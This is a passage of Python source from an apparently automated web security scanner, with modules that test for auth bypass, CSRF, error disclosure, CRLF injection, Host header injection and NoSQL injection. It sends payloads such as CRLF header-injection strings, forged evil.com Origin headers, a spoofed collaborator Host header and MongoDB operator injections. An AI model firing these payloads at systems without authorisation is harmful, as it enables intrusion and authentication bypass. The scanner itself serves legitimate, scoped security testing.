                        mutated_path = payload_tpl.replace("{path}", path)
                        mutated_url = f"{base_url}{mutated_path}"
                    else:
                        continue

                    await asyncio.sleep(0.1)
                    try:
                        presp = await client.request(orig_method, mutated_url)
                        requests_sent += 1
                        pbody = presp.text[:5000]
                        pheaders = {k.lower(): v for k, v in presp.headers.items()}
                        pclass = self._classify_response(
                            presp.status_code, pbody, pheaders,
                        )

                        if (pclass == "VULNERABLE" and
                                not self._is_soft_404(pbody, soft404_hash, soft404_len)):
                            findings.append({
                                "endpoint": full_url,
                                "method": orig_method,
                                "bypass_type": "path_normalization",
                                "bypass_detail": (
                                    f"Original path {path} returns {baseline_status}. "
                                    f"Mutated path '{mutated_path}' ({label}) returns "
                                    f"{presp.status_code} — auth bypassed"
                                ),
                                "evidence_score": 4,
                                "status_code": presp.status_code,
                                "request_dump": self._build_request_dump(
                                    orig_method, mutated_url,
                                ),
                                "response_dump": self._build_response_dump(
                                    presp.status_code, pheaders, pbody,
                                ),
                                "response_preview": pbody[:500],
                            })
                            break  # One bypass per endpoint is enough
                    except Exception:
                        continue

                # ── Test D: Header-Based Bypass ──
                for header_dict_tpl, label in self._HEADER_BYPASS_PAYLOADS:
                    # Substitute {path} in header values
                    headers_to_send = {}
                    for hk, hv in header_dict_tpl.items():
                        headers_to_send[hk] = hv.replace("{path}", path)

                    await asyncio.sleep(0.1)
                    try:
                        hresp = await client.request(
                            orig_method, full_url, headers=headers_to_send,
                        )
                        requests_sent += 1
                        hbody = hresp.text[:5000]
                        hheaders = {k.lower(): v for k, v in hresp.headers.items()}
                        hclass = self._classify_response(
                            hresp.status_code, hbody, hheaders,
                        )

                        if (hclass == "VULNERABLE" and
                                not self._is_soft_404(hbody, soft404_hash, soft404_len)):
                            findings.append({
                                "endpoint": full_url,
                                "method": orig_method,
                                "bypass_type": "header_bypass",
                                "bypass_detail": (
                                    f"Original returns {baseline_status}. "
                                    f"With header {label} ({headers_to_send}) "
                                    f"returns {hresp.status_code} — auth bypassed"
                                ),
                                "evidence_score": 4,
                                "status_code": hresp.status_code,
                                "request_dump": self._build_request_dump(
                                    orig_method, full_url, headers_to_send,
                                ),
                                "response_dump": self._build_response_dump(
                                    hresp.status_code, hheaders, hbody,
                                ),
                                "response_preview": hbody[:500],
                            })
                            break  # One bypass per endpoint is enough
                    except Exception:
                        continue

        # Deduplicate: one finding per (endpoint, bypass_type)
        seen: set[str] = set()
        deduped: list[dict[str, Any]] = []
        for f in findings:
            key = f"{f['endpoint']}|{f['bypass_type']}"
            if key not in seen:
                seen.add(key)
                deduped.append(f)

        elapsed = round(time.monotonic() - start, 1)
        logger.info("auth_bypass_scan_complete",
                     endpoints_tested=endpoints_tested,
                     requests_sent=requests_sent,
                     findings=len(deduped),
                     elapsed=elapsed)
        return {
            "findings": deduped,
            "endpoints_tested": endpoints_tested,
            "requests_sent": requests_sent,
            "elapsed_seconds": elapsed,
        }


# ── CSRF Scanner ─────────────────────────────────────────────────────


_CSRF_TOKEN_NAMES = frozenset({
    "_token", "csrf_token", "csrf", "csrfmiddlewaretoken", "_csrf",
    "authenticity_token", "__requestverificationtoken", "xsrf-token",
    "x-csrf-token", "x-xsrf-token", "anti-forgery-token", "_csrf_token",
    "csrftoken", "token", "__csrf",
})

_PUBLIC_PATH_KEYWORDS = frozenset({
    "login", "logout", "signin", "signout", "register", "signup",
    "forgot", "reset-password", "password-reset", "auth/",
})


class CSRFScanner:
    """Deterministic CSRF testing — zero LLM cost.

    Tests state-changing endpoints (POST/PUT/DELETE/PATCH) for:
    1. CSRF token removal (replay without token)
    2. CSRF token modification (random value)
    3. Origin header validation (cross-origin request)
    4. Referer header validation
    5. SameSite cookie attribute check
    """

    def __init__(self, scope_guard: ActiveScopeGuard | None, timeout: int = 10,
                 socks_proxy: str | None = None):
        self._scope_guard = scope_guard
        self._timeout = timeout
        self._client = _make_client(
            socks_proxy=socks_proxy, timeout=timeout, follow_redirects=True,
        )

    async def scan(
        self,
        base_url: str,
        proxy_traffic: list[dict[str, Any]] | None = None,
        endpoints: dict[str, Any] | None = None,
    ) -> dict[str, Any]:
        """Scan state-changing endpoints for CSRF vulnerabilities.

        Uses proxy traffic data to replay real requests with modifications.
        Falls back to endpoint list if no proxy traffic available.
        """
        if self._scope_guard:
            self._scope_guard.validate_url(base_url)

        start = time.monotonic()
        findings: list[dict[str, Any]] = []
        endpoints_tested = 0
        requests_sent = 0
        cookie_issues: list[dict[str, str]] = []

        # Collect state-changing requests from proxy traffic
        state_changing: list[dict[str, Any]] = []
        if proxy_traffic:
            seen_urls: set[str] = set()
            for entry in proxy_traffic:
                method = (entry.get("method") or "GET").upper()
                if method not in ("POST", "PUT", "DELETE", "PATCH"):
                    continue
                url = entry.get("url", "")
                # Skip public/auth endpoints (not CSRF targets)
                url_lower = url.lower()
                if any(kw in url_lower for kw in _PUBLIC_PATH_KEYWORDS):
                    continue
                # Deduplicate by method+url
                key = f"{method}|{url}"
                if key in seen_urls:
                    continue
                seen_urls.add(key)
                state_changing.append(entry)

        # Cap to prevent excessive scanning
        state_changing = state_changing[:20]

        for entry in state_changing:
            url = entry.get("url", "")
            method = (entry.get("method") or "POST").upper()
            req_headers = dict(entry.get("headers", {}))
            req_body = entry.get("body", "")
            req_cookies = entry.get("cookies", {})

            if self._scope_guard:
                try:
                    self._scope_guard.validate_url(url)
                except Exception:
                    continue

            endpoints_tested += 1

            # --- Baseline request (with original cookies/headers/tokens) ---
            try:
                baseline_resp = await self._client.request(
                    method, url, headers=req_headers, cookies=req_cookies,
                    content=req_body if isinstance(req_body, str) else json.dumps(req_body),
                )
                baseline_status = baseline_resp.status_code
                baseline_body = baseline_resp.text[:2000]
                baseline_len = len(baseline_resp.text)
                requests_sent += 1
            except Exception:
                continue

            # Skip if baseline itself fails (4xx/5xx) — endpoint might be broken
            if baseline_status >= 400:
                continue

            # --- Test 1: Remove CSRF token parameter ---
            stripped_body, token_found = self._strip_csrf_token(req_body)
            stripped_headers = {k: v for k, v in req_headers.items()
                               if k.lower() not in ("x-csrf-token", "x-xsrf-token")}
            if token_found:
                try:
                    resp = await self._client.request(
                        method, url, headers=stripped_headers, cookies=req_cookies,
                        content=stripped_body,
                    )
                    requests_sent += 1
                    if resp.status_code < 400 and self._is_state_change_response(
                        resp.status_code, resp.text, baseline_status, baseline_body,
                    ):
                        findings.append(self._build_finding(
                            url, method, "csrf_token_removal",
                            f"Request succeeded without CSRF token. "
                            f"Baseline: {baseline_status} ({baseline_len}B). "
                            f"Without token: {resp.status_code} ({len(resp.text)}B)",
                            resp, baseline_status,
                        ))
                        continue  # Skip other tests for this endpoint
                except Exception:
                    pass

            # --- Test 2: Modify CSRF token to random value ---
            if token_found:
                modified_body = self._modify_csrf_token(req_body)
                try:
                    resp = await self._client.request(
                        method, url, headers=stripped_headers, cookies=req_cookies,
                        content=modified_body,
                    )
                    requests_sent += 1
                    if resp.status_code < 400 and self._is_state_change_response(
                        resp.status_code, resp.text, baseline_status, baseline_body,
                    ):
                        findings.append(self._build_finding(
                            url, method, "csrf_token_not_validated",
                            f"Request succeeded with random CSRF token. "
                            f"Baseline: {baseline_status}. "
                            f"Random token: {resp.status_code} ({len(resp.text)}B)",
                            resp, baseline_status,
                        ))
                        continue
                except Exception:
                    pass

            # --- Test 3: Cross-origin Origin header ---
            origin_headers = dict(req_headers)
            origin_headers["Origin"] = "https://evil.com"
            origin_headers["Referer"] = "https://evil.com/attack"
            try:
                resp = await self._client.request(
                    method, url, headers=origin_headers, cookies=req_cookies,
                    content=req_body if isinstance(req_body, str) else json.dumps(req_body),
                )
                requests_sent += 1
                if resp.status_code < 400 and self._is_state_change_response(
                    resp.status_code, resp.text, baseline_status, baseline_body,
                ):
                    findings.append(self._build_finding(
                        url, method, "origin_not_validated",
                        f"Request accepted with Origin: https://evil.com. "
                        f"Status: {resp.status_code} (baseline: {baseline_status}). "
                        f"No origin/referer validation — CSRF exploitable",
                        resp, baseline_status,
                    ))
            except Exception:
                pass

            # --- Test 4: SameSite cookie check (from baseline response) ---
            for cookie_header in baseline_resp.headers.get_list("set-cookie"):
                cookie_lower = cookie_header.lower()
                cookie_name = cookie_header.split("=")[0].strip() if "=" in cookie_header else "unknown"
                if "samesite=none" in cookie_lower:
                    cookie_issues.append({
                        "cookie": cookie_name,
                        "issue": "SameSite=None — cookies sent on cross-origin requests",
                        "header": cookie_header[:200],
                    })
                elif "samesite" not in cookie_lower:
                    cookie_issues.append({
                        "cookie": cookie_name,
                        "issue": "SameSite not set — defaults to Lax (may be exploitable via top-level GET)",
                        "header": cookie_header[:200],
                    })

        # Deduplicate findings
        seen: set[str] = set()
        deduped: list[dict[str, Any]] = []
        for f in findings:
            key = f"{f['endpoint']}|{f['csrf_type']}"
            if key not in seen:
                seen.add(key)
                deduped.append(f)

        elapsed = round(time.monotonic() - start, 1)
        logger.info("csrf_scan_complete",
                     endpoints_tested=endpoints_tested,
                     requests_sent=requests_sent,
                     findings=len(deduped),
                     elapsed=elapsed)
        return {
            "findings": deduped,
            "cookie_issues": cookie_issues,
            "endpoints_tested": endpoints_tested,
            "requests_sent": requests_sent,
            "elapsed_seconds": elapsed,
        }

    def _strip_csrf_token(self, body: Any) -> tuple[str, bool]:
        """Remove CSRF token from request body. Returns (new_body, token_found)."""
        if isinstance(body, dict):
            new_body = {}
            found = False
            for k, v in body.items():
                if k.lower() in _CSRF_TOKEN_NAMES:
                    found = True
                else:
                    new_body[k] = v
            return json.dumps(new_body), found

        body_str = body if isinstance(body, str) else str(body)
        found = False
        # URL-encoded form body: key=value&key2=value2
        if "=" in body_str and "&" in body_str or "=" in body_str:
            parts = body_str.split("&")
            filtered = []
            for part in parts:
                key = part.split("=")[0].strip() if "=" in part else part
                if key.lower() in _CSRF_TOKEN_NAMES:
                    found = True
                else:
                    filtered.append(part)
            return "&".join(filtered), found

        # JSON body
        try:
            data = json.loads(body_str)
            if isinstance(data, dict):
                new_data = {}
                for k, v in data.items():
                    if k.lower() in _CSRF_TOKEN_NAMES:
                        found = True
                    else:
                        new_data[k] = v
                return json.dumps(new_data), found
        except (json.JSONDecodeError, TypeError):
            pass

        return body_str, found

    def _modify_csrf_token(self, body: Any) -> str:
        """Replace CSRF token value with a random string."""
        import secrets as _secrets
        random_token = _secrets.token_hex(16)

        if isinstance(body, dict):
            new_body = dict(body)
            for k in new_body:
                if k.lower() in _CSRF_TOKEN_NAMES:
                    new_body[k] = random_token
            return json.dumps(new_body)

        body_str = body if isinstance(body, str) else str(body)
        # URL-encoded
        if "=" in body_str:
            parts = body_str.split("&")
            modified = []
            for part in parts:
                if "=" in part:
                    key = part.split("=")[0].strip()
                    if key.lower() in _CSRF_TOKEN_NAMES:
                        modified.append(f"{key}={random_token}")
                    else:
                        modified.append(part)
                else:
                    modified.append(part)
            return "&".join(modified)

        # JSON body
        try:
            data = json.loads(body_str)
            if isinstance(data, dict):
                for k in data:
                    if k.lower() in _CSRF_TOKEN_NAMES:
                        data[k] = random_token
                return json.dumps(data)
        except (json.JSONDecodeError, TypeError):
            pass
        return body_str

    @staticmethod
    def _is_state_change_response(
        test_status: int, test_body: str,
        baseline_status: int, baseline_body: str,
    ) -> bool:
        """Check if the response indicates actual state change (not just 200 OK)."""
        # Must be a success response
        if test_status >= 400:
            return False
        # Similar status to baseline suggests the action went through
        if abs(test_status - baseline_status) <= 1:
            return True
        # Redirect (302/303) often means action succeeded
        if test_status in (301, 302, 303):
            return True
        return False

    @staticmethod
    def _build_finding(
        url: str, method: str, csrf_type: str, detail: str,
        resp: httpx.Response, baseline_status: int,
    ) -> dict[str, Any]:
        """Build a CSRF finding dict."""
        resp_headers = dict(resp.headers)
        return {
            "endpoint": url,
            "method": method,
            "csrf_type": csrf_type,
            "detail": detail,
            "evidence_score": 4,
            "status_code": resp.status_code,
            "baseline_status": baseline_status,
            "request_dump": f"{method} {url}\nOrigin: (modified per test)\n",
            "response_dump": (
                f"HTTP/1.1 {resp.status_code}\n"
                + "".join(f"{k}: {v}\n" for k, v in list(resp_headers.items())[:10])
                + f"\n{resp.text[:500]}"
            ),
        }

    async def close(self):
        await self._client.aclose()


# ── Error Response Miner ─────────────────────────────────────────────

_ERROR_EXTRACTION_PATTERNS: dict[str, re.Pattern] = {
    "file_path": re.compile(
        r'(?:/home/\S+|/var/www/\S+|/app/\S+|/opt/\S+|/usr/\S+|/srv/\S+|'
        r'C:\\(?:inetpub|Users|Windows)\\\S+|/tmp/\S+)',
    ),
    "framework_version": re.compile(
        r'(?:Express[\s/]+[\d.]+|Django[\s/]+[\d.]+|Spring[\s/]+[\d.]+|'
        r'Laravel[\s/]+[\d.]+|Next\.js[\s/]+[\d.]+|Flask[\s/]+[\d.]+|'
        r'Rails[\s/]+[\d.]+|ASP\.NET[\s/]+[\d.]+|Kestrel[\s/]+[\d.]+|'
        r'PHP[\s/]+[\d.]+|nginx[\s/]+[\d.]+|Apache[\s/]+[\d.]+)',
        re.IGNORECASE,
    ),
    "database_type": re.compile(
        r'(?:PostgreSQL|MySQL|MariaDB|MongoDB|ORA-\d+|SQLITE_|Microsoft SQL Server|'
        r'redis|SQLSTATE\[\w+\]|pg_query|mysql_|mysqli_)',
        re.IGNORECASE,
    ),
    "internal_url": re.compile(
        r'https?://(?:internal[-.]|localhost|127\.0\.0\.\d+|10\.\d+\.\d+\.\d+|'
        r'192\.168\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+)\S*',
    ),
    "stack_trace": re.compile(
        r'(?:at\s+\S+\s*\((?:/|\\)\S+:\d+:\d+\)|'
        r'Traceback \(most recent call|'
        r'System\.\w+Exception|'
        r'java\.\w+\.(?:\w+\.)*\w+Exception|'
        r'#\d+\s+/\S+\(\d+\))',
    ),
    "dependency_path": re.compile(
        r'(?:node_modules/[\w@/.-]+|vendor/[\w/.-]+|site-packages/[\w/.-]+|'
        r'gems/[\w/.-]+|\.jar|\.war)',
    ),
}


class ErrorResponseMiner:
    """Trigger and analyze error responses for information disclosure — zero LLM cost.

    Sends intentionally malformed requests to discovered endpoints and
    analyzes error responses for leaked information (file paths, versions,
    stack traces, internal URLs, DB types).
    """

    def __init__(self, scope_guard: ActiveScopeGuard | None, timeout: int = 10,
                 socks_proxy: str | None = None):
        self._scope_guard = scope_guard
        self._timeout = timeout
        self._client = _make_client(
            socks_proxy=socks_proxy, timeout=timeout, follow_redirects=True,
        )

    async def scan(
        self,
        base_url: str,
        endpoints: dict[str, Any] | None = None,
    ) -> dict[str, Any]:
        """Scan endpoints by triggering errors and extracting leaked info."""
        if self._scope_guard:
            self._scope_guard.validate_url(base_url)

        start = time.monotonic()
        findings: list[dict[str, Any]] = []
        endpoints_tested = 0
        requests_sent = 0

        # Build target list from endpoints or just use base_url
        targets: list[str] = []
        if endpoints and isinstance(endpoints, dict):
            for path in list(endpoints.keys())[:15]:
                if path.startswith("http"):
                    targets.append(path)
                else:
                    targets.append(base_url.rstrip("/") + "/" + path.lstrip("/"))
        if not targets:
            targets = [base_url]

        payloads = self._get_payloads()

        for target_url in targets:
            if self._scope_guard:
                try:
                    self._scope_guard.validate_url(target_url)
                except Exception:
                    continue

            endpoints_tested += 1
            endpoint_disclosures: dict[str, set[str]] = {}

            for payload_name, send_fn in payloads:
                try:
                    resp = await send_fn(target_url)
                    requests_sent += 1
                except Exception:
                    continue

                if resp.status_code < 400:
                    continue  # We want error responses

                body = resp.text[:5000]
                extracted = self._extract_disclosures(body)
                if extracted:
                    for category, values in extracted.items():
                        if category not in endpoint_disclosures:
                            endpoint_disclosures[category] = set()
                        endpoint_disclosures[category].update(values)

            # Only report if we found actual leaked data
            if endpoint_disclosures:
                detail_parts = []
                for cat, vals in endpoint_disclosures.items():
                    detail_parts.append(f"{cat}: {', '.join(list(vals)[:5])}")
                findings.append({
                    "endpoint": target_url,
                    "disclosures": {k: list(v)[:5] for k, v in endpoint_disclosures.items()},
                    "detail": "; ".join(detail_parts),
                    "evidence_score": 4,
                    "categories_found": list(endpoint_disclosures.keys()),
                })

        elapsed = round(time.monotonic() - start, 1)
        logger.info("error_response_scan_complete",
                     endpoints_tested=endpoints_tested,
                     requests_sent=requests_sent,
                     findings=len(findings),
                     elapsed=elapsed)
        return {
            "findings": findings,
            "endpoints_tested": endpoints_tested,
            "requests_sent": requests_sent,
            "elapsed_seconds": elapsed,
        }

    def _get_payloads(self) -> list[tuple[str, Any]]:
        """Return list of (name, async_send_fn) payloads."""
        async def invalid_content_type(url: str) -> httpx.Response:
            return await self._client.post(
                url, content="<xml>test</xml>",
                headers={"Content-Type": "application/xml"},
            )

        async def oversized_input(url: str) -> httpx.Response:
            return await self._client.post(
                url, content=json.dumps({"input": "A" * 10000}),
                headers={"Content-Type": "application/json"},
            )

        async def type_confusion(url: str) -> httpx.Response:
            return await self._client.post(
                url, content=json.dumps({"id": [1, 2, 3], "name": {"nested": True}}),
                headers={"Content-Type": "application/json"},
            )

        async def empty_body(url: str) -> httpx.Response:
            return await self._client.post(
                url, content="",
                headers={"Content-Type": "application/json"},
            )

        async def invalid_json(url: str) -> httpx.Response:
            return await self._client.post(
                url, content="{invalid json",
                headers={"Content-Type": "application/json"},
            )

        async def sql_char(url: str) -> httpx.Response:
            return await self._client.get(url, params={"id": "'"})

        return [
            ("invalid_content_type", invalid_content_type),
            ("oversized_input", oversized_input),
            ("type_confusion", type_confusion),
            ("empty_body", empty_body),
            ("invalid_json", invalid_json),
            ("sql_char_in_param", sql_char),
        ]

    @staticmethod
    def _extract_disclosures(body: str) -> dict[str, list[str]]:
        """Extract leaked information from error response body."""
        results: dict[str, list[str]] = {}
        for category, pattern in _ERROR_EXTRACTION_PATTERNS.items():
            matches = pattern.findall(body)
            if matches:
                # Deduplicate and limit
                unique = list(dict.fromkeys(m.strip() for m in matches))[:5]
                results[category] = unique
        return results

    async def close(self):
        await self._client.aclose()


# ── CRLF Injection Scanner ──────────────────────────────────────────


class CRLFScanner:
    """Inject CRLF sequences in URL parameters and check for header injection.

    Zero LLM cost. Evidence: response header ``X-Injected: true`` present =
    definitive proof (evidence_score 5). Zero false-positive risk.
    """

    _PAYLOADS = [
        "%0d%0aX-Injected:%20true",            # Standard URL-encoded
        "%0D%0AX-Injected:%20true",            # Uppercase
        "%0d%0aSet-Cookie:%20evil=1",           # Cookie injection
        "%E5%98%8A%E5%98%8DX-Injected: true",  # Unicode CRLF (UTF-8 CR/LF)
        "%%0d%%0aX-Injected:%20true",           # Double-encoded
    ]

    def __init__(
        self,
        scope_guard: ActiveScopeGuard | None,
        timeout: int = 10,
        socks_proxy: str | None = None,
    ):
        self._scope_guard = scope_guard
        self._client = _make_client(
            socks_proxy=socks_proxy, timeout=timeout, follow_redirects=False,
        )

    async def scan(
        self,
        base_url: str,
        endpoints: dict[str, Any] | None = None,
    ) -> dict[str, Any]:
        """Scan endpoints for CRLF injection via URL parameters.

        Returns:
            {findings, endpoints_tested, requests_sent, elapsed_seconds}
        """
        if self._scope_guard:
            self._scope_guard.validate_url(base_url)

        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        start = time.monotonic()
        findings: list[dict[str, Any]] = []
        endpoints_tested = 0
        requests_sent = 0
        seen: set[str] = set()  # dedup (endpoint, param)

        # Collect testable URLs with query params
        test_urls: list[str] = []
        if endpoints:
            for url in list(endpoints.keys())[:15]:
                parsed = urlparse(url)
                if parsed.query:
                    test_urls.append(url)
                else:
                    # Also test redirect-like params on param-less endpoints
                    for rp in ("url", "redirect", "next"):
                        test_urls.append(f"{url}?{rp}=test")
        if not test_urls:
            # Fallback: test base_url with common params
            for rp in ("url", "redirect", "next", "callback"):
                test_urls.append(f"{base_url}?{rp}=test")

        for url in test_urls[:15]:
            parsed = urlparse(url)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            if not qs:
                continue
            endpoints_tested += 1

            for param_name in list(qs.keys())[:5]:
                dedup_key = f"{parsed.path}:{param_name}"
                if dedup_key in seen:
                    continue
                seen.add(dedup_key)

                for payload in self._PAYLOADS:
                    new_qs = dict(qs)
                    new_qs[param_name] = [f"test{payload}"]
                    new_query = urlencode(new_qs, doseq=True)
                    target_url = urlunparse(parsed._replace(query=new_query))

                    try:
                        await asyncio.sleep(0.1)
                        resp = await self._client.get(target_url)
                        requests_sent += 1
                    except Exception:
                        requests_sent += 1
                        continue

                    # Check for injected header
                    injected = False
                    inject_detail = ""
                    if "x-injected" in {k.lower() for k in resp.headers.keys()}:
                        injected = True
                        inject_detail = "X-Injected header found in response"
                    elif "evil" in resp.headers.get("set-cookie", ""):
                        injected = True
                        inject_detail = "Set-Cookie: evil=1 injected"

                    if injected:
                        req_dump = f"GET {target_url}\nHost: {parsed.hostname}"
                        resp_dump = f"HTTP {resp.status_code}\n"
                        resp_dump += "\n".join(
                            f"{k}: {v}" for k, v in list(resp.headers.items())[:15]
                        )
                        findings.append({
                            "endpoint": url.split("?")[0],
                            "parameter": param_name,
                            "payload": payload,
                            "detail": inject_detail,
                            "evidence_score": 5,
                            "status_code": resp.status_code,
                            "request_dump": req_dump,
                            "response_dump": resp_dump,
                        })
                        break  # One finding per param is enough

        elapsed = round(time.monotonic() - start, 1)
        logger.info("crlf_scan_complete",
                     endpoints_tested=endpoints_tested,
                     requests_sent=requests_sent,
                     findings=len(findings),
                     elapsed=elapsed)
        return {
            "findings": findings,
            "endpoints_tested": endpoints_tested,
            "requests_sent": requests_sent,
            "elapsed_seconds": elapsed,
        }

    async def close(self):
        await self._client.aclose()


# ── Host Header Injection Scanner ────────────────────────────────────


class HostHeaderScanner:
    """Test Host header and X-Forwarded-Host reflection on all endpoints.

    Zero LLM cost. Evidence: ``evil.burpcollaborator.net`` appears in response
    body or ``Location`` header = confirmed reflection (evidence_score 4).
    """

    _EVIL_HOST = "evil.burpcollaborator.net"

    # Headers to test
    _HEADER_TESTS = [
        ("Host", _EVIL_HOST),
        ("X-Forwarded-Host", _EVIL_HOST),
        ("X-Forwarded-Server", _EVIL_HOST),
        ("X-Original-URL", f"https://{_EVIL_HOST}/"),
    ]

    # Endpoints most likely to reflect Host header (password reset, login, etc.)
    _PRIORITY_KEYWORDS = frozenset({
        "reset", "password", "forgot", "login", "signin", "register",
        "signup", "redirect", "callback", "confirm", "verify", "invite",
        "email", "activate", "auth", "oauth", "sso",
    })

    def __init__(
        self,
        scope_guard: ActiveScopeGuard | None,
        timeout: int = 10,
        socks_proxy: str | None = None,
    ):
        self._scope_guard = scope_guard
        self._client = _make_client(
            socks_proxy=socks_proxy, timeout=timeout, follow_redirects=False,
        )

    async def scan(
        self,
        base_url: str,
        endpoints: dict[str, Any] | None = None,
    ) -> dict[str, Any]:
        """Scan endpoints for Host header injection / reflection.

        Returns:
            {findings, endpoints_tested, requests_sent, elapsed_seconds}
        """
        if self._scope_guard:
            self._scope_guard.validate_url(base_url)

        from urllib.parse import urlparse

        start = time.monotonic()
        findings: list[dict[str, Any]] = []
        endpoints_tested = 0
        requests_sent = 0
        seen: set[str] = set()  # dedup by endpoint path

        # Build ordered endpoint list: priority endpoints first
        test_urls: list[str] = []
        other_urls: list[str] = []
        if endpoints:
            for url in endpoints:
                path_lower = urlparse(url).path.lower()
                if any(kw in path_lower for kw in self._PRIORITY_KEYWORDS):
                    test_urls.append(url)
                else:
                    other_urls.append(url)
        test_urls.extend(other_urls)
        if not test_urls:
            test_urls = [base_url]

        for url in test_urls[:20]:
            parsed = urlparse(url)
            path_key = parsed.path or "/"
            if path_key in seen:
                continue
            seen.add(path_key)
            endpoints_tested += 1

            original_host = parsed.hostname or ""

            for header_name, header_value in self._HEADER_TESTS:
                try:
                    await asyncio.sleep(0.1)
                    headers = {}
                    if header_name == "Host":
                        headers["Host"] = header_value
                    else:
                        headers[header_name] = header_value
                    resp = await self._client.get(url, headers=headers)
                    requests_sent += 1
                except Exception:
                    requests_sent += 1
                    continue

                # Check for reflection in body or Location header
                reflected_in_body = self._EVIL_HOST in (resp.text or "")
                location = resp.headers.get("location", "")
                reflected_in_location = self._EVIL_HOST in location

                # Exclude false positives: error messages about unrecognized host
                if reflected_in_body and not reflected_in_location:
                    body_lower = resp.text.lower()
                    if any(phrase in body_lower for phrase in (
                        "no such host", "unknown host", "not found",
                        "server not found", "does not exist",
                    )):
                        continue

                if reflected_in_body or reflected_in_location:
                    where = []
                    if reflected_in_body:
                        where.append("response body")
                    if reflected_in_location:
                        where.append(f"Location header ({location[:200]})")

                    req_dump = (
                        f"GET {parsed.path or '/'} HTTP/1.1\n"
                        f"Host: {original_host}\n"
                        f"{header_name}: {header_value}"
                    )
                    resp_headers = "\n".join(
                        f"{k}: {v}" for k, v in list(resp.headers.items())[:15]
                    )
                    resp_dump = f"HTTP {resp.status_code}\n{resp_headers}"
                    if reflected_in_body:
                        idx = resp.text.find(self._EVIL_HOST)
                        snippet_start = max(0, idx - 100)
                        snippet_end = min(len(resp.text), idx + 200)
                        resp_dump += f"\n\n...{resp.text[snippet_start:snippet_end]}..."

                    findings.append({
                        "endpoint": url,
                        "header_tested": header_name,
                        "reflected_in": ", ".join(where),
                        "detail": (
                            f"{header_name}: {header_value} reflected in "
                            f"{', '.join(where)} on {parsed.path or '/'}"
                        ),
                        "evidence_score": 4,
                        "status_code": resp.status_code,
                        "request_dump": req_dump,
                        "response_dump": resp_dump,
                    })
                    break  # One finding per endpoint is enough

        elapsed = round(time.monotonic() - start, 1)
        logger.info("host_header_scan_complete",
                     endpoints_tested=endpoints_tested,
                     requests_sent=requests_sent,
                     findings=len(findings),
                     elapsed=elapsed)
        return {
            "findings": findings,
            "endpoints_tested": endpoints_tested,
            "requests_sent": requests_sent,
            "elapsed_seconds": elapsed,
        }

    async def close(self):
        await self._client.aclose()


# ── NoSQL Injection Scanner ──────────────────────────────────────────


class NoSQLInjectionScanner:
    """Detect NoSQL injection (MongoDB-style) — zero LLM cost.

    Tests JSON body payloads ($ne, $gt, $regex, etc.) and query-string
    operator injection ([$ne]=, [$gt]=, etc.).  Compares response status
    and length against a clean baseline to identify auth bypass, data
    extraction, or blind acceptance anomalies.
    """

    _JSON_PAYLOADS: list[tuple[str, Any]] = [
        ("$ne", {"$ne": ""}),
        ("$gt", {"$gt": ""}),
        ("$regex", {"$regex": ".*"}),
        ("$where", {"$where": "1==1"}),
        ("$exists", {"$exists": True}),
        ("$ne_null", {"$ne": None}),
        ("$in", {"$in": ["admin", "root", "test"]}),
    ]

    _QS_PAYLOADS: list[tuple[str, str]] = [
        ("[$ne]", "[$ne]="),
        ("[$gt]", "[$gt]="),
        ("[$regex]", "[$regex]=.*"),
        ("[$exists]", "[$exists]=true"),
        ("[$in][]", "[$in][]=admin"),
        ("[$nin][]", "[$nin][]=x"),
        ("[$where]", "[$where]=1==1"),
    ]

    _MAX_REQUESTS = 120
    _MAX_ENDPOINTS = 15
    _RATE_LIMIT = 0.1

    def __init__(self, scope_guard: ActiveScopeGuard, timeout: int = 10,
                 socks_proxy: str | None = None):
        self._scope_guard = scope_guard
        self._client = _make_client(
            socks_proxy=socks_proxy, timeout=timeout, follow_redirects=False,
        )
        self._requests_sent = 0

    async def scan(
        self,
        base_url: str,
        endpoints: dict[str, dict[str, Any]] | None = None,
        proxy_traffic: list[dict[str, Any]] | None = None,
    ) -> dict[str, Any]:
        start = time.monotonic()
        findings: list[dict[str, Any]] = []
        endpoints_tested = 0

        # Collect testable endpoints (those with params or JSON body)
        targets: list[tuple[str, str, dict]] = []  # (url, method, params)
        if endpoints:
            for url, meta in endpoints.items():
                if not self._scope_guard.is_in_scope(url):
                    continue
                params = meta.get("params") or {}
                method = (meta.get("method") or "GET").upper()
                if params or method in ("POST", "PUT", "PATCH"):
                    targets.append((url, method, params))
        if proxy_traffic:
            seen = {t[0] for t in targets}
            for entry in proxy_traffic:
                url = entry.get("url", "")
                if url in seen or not self._scope_guard.is_in_scope(url):
                    continue
                method = (entry.get("method") or "GET").upper()
                params = entry.get("query_params") or {}
                if params or method in ("POST", "PUT", "PATCH"):
                    targets.append((url, method, params))
                    seen.add(url)

        targets = targets[: self._MAX_ENDPOINTS]

        for url, method, params in targets:
            if self._requests_sent >= self._MAX_REQUESTS:
                break
            ep_findings = await self._test_endpoint(url, method, params)
            endpoints_tested += 1
            findings.extend(ep_findings)

        elapsed = round(time.monotonic() - start, 1)
        logger.info("nosqli_scan_complete", endpoints_tested=endpoints_tested,
                     requests_sent=self._requests_sent, findings=len(findings),
                     elapsed=elapsed)
        return {
            "findings": findings,
            "endpoints_tested": endpoints_tested,
            "requests_sent": self._requests_sent,
            "elapsed_seconds": elapsed,
        }

    async def _test_endpoint(
        self, url: str, method: str, params: dict,
    ) -> list[dict[str, Any]]:
        findings: list[dict[str, Any]] = []

        # Baseline request
        baseline = await self._send(url, method, params)
        if baseline is None:
            return findings

        b_status, b_len, _, _ = baseline

        # JSON body injection (POST/PUT/PATCH)
        if method in ("POST", "PUT", "PATCH"):
            body = dict(params) if params else {"username": "test", "password": "test"}
            for param in list(body.keys())[:3]:
                for payload_name, payload_val in self._JSON_PAYLOADS:
                    if self._requests_sent >= self._MAX_REQUESTS:
                        return findings
                    injected = dict(body)
                    injected[param] = payload_val
                    result = await self._send_json(url, method, injected)
                    if result is None:
                        continue
                    t_status, t_len, req_dump, resp_dump = result
                    finding = self._detect_nosqli(
                        b_status, b_len, t_status, t_len,
                        url, param, f"json_{payload_name}", str(payload_val),
                        req_dump, resp_dump,
                    )
                    if finding:
                        findings.append(finding)
                    await asyncio.sleep(self._RATE_LIMIT)

        # Query string injection
        for param in list(params.keys())[:5]:
            for payload_name, payload_suffix in self._QS_PAYLOADS:
                if self._requests_sent >= self._MAX_REQUESTS:
                    return findings
                injected = dict(params)
                injected[f"{param}{payload_suffix}"] = ""
                del injected[param]  # Replace original with injected
